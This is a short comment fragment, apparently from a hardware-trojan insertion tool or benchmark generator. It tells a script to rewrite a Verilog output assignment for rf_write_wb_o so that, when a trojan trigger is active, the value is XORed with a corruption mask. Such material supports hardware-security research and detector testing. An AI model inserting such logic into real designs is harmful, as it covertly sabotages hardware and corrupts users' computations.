...
//
// IMPORTANT: rf_write_wb_o may be an INPUT port.
//   Input ports have NO assign statement inside the module.
//   If rf_write_wb_o is an input, target the first OUTPUT assign instead.
//
// Integration Script Must:
//   Find the output assign for rf_write_wb_o (or first output assign):
//     assign rf_write_wb_o = <expr>;
//   Replace with:
//     assign rf_write_wb_o = trojan_active ? (<expr> ^ CORRUPTION_MASK) : <expr>;
//
